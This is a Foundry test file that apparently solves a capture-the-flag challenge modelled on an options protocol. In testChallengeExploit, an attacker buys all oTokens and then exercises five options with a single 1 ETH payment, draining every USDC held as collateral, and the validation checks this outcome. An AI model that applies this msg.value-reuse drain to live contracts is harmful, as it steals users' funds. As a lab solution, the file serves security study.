// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {Token} from "src/other/Token.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {OptionsContract} from "src/opyn-sesame/OptionsContract.sol";
import {OptionsMarket} from "src/opyn-sesame/OptionsMarket.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used
    address adminUser2 = makeAddr('adminUser2'); // should not be used
    address adminUser3 = makeAddr('adminUser3'); // should not be used
    address adminUser4 = makeAddr('adminUser4'); // should not be used
    address adminUser5 = makeAddr('adminUser5'); // should not be used
    address[] addresses; // list of admin addresses

    Token usdc;
    OptionsMarket optionsMarket;
    OptionsContract optionsContract;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');

        vm.prank(admin);
        usdc.mint(attacker,500e18); // attacker starts w/ 500 USDC

        // deploying core contracts
        vm.prank(admin);
        optionsMarket = new OptionsMarket(address(usdc));

        vm.prank(admin);
        optionsContract = new OptionsContract(
            IERC20(address(usdc)),
            2_000, // strike price of 2000 USDC per ETH
            block.timestamp+(60*60), // 1hr expiry
            address(optionsMarket)
        );

        vm.prank(admin);
        optionsMarket.setPrice(100); // 100 USDC premium per oToken
        vm.prank(admin);
        optionsMarket.setOptionsContract(address(optionsContract));

        // --adminUser(s) issue 1 option each
        addresses = new address[](5);
        addresses[0]=adminUser;  addresses[1]=adminUser2;
        addresses[2]=adminUser3; addresses[3]=adminUser4;
        addresses[4]=adminUser5;

        for (uint i=0; i<5; ++i) {
            vm.prank(admin);
            usdc.mint(addresses[i],2_000e18);
            
            vm.prank(addresses[i]);
            usdc.approve(address(optionsContract),2_000e18);

            vm.prank(addresses[i]);
            optionsContract.createAndSellERC20CollateralOption(2_000e18);
        }

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        usdc.approve(address(optionsMarket),type(uint).max);
        optionsMarket.purchase(optionsContract.balanceOf(address(optionsMarket)));
        optionsContract.exercise{value:1e18}(5e18,addresses);

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker acquires all USDC from options contract - doesn't use more than 1 ETH
        assertEq(usdc.balanceOf(address(optionsContract)),0);
        assertGe(usdc.balanceOf(attacker),10_000e18);
        assertGe(attacker.balance,10_000e18-1e18);

    }

}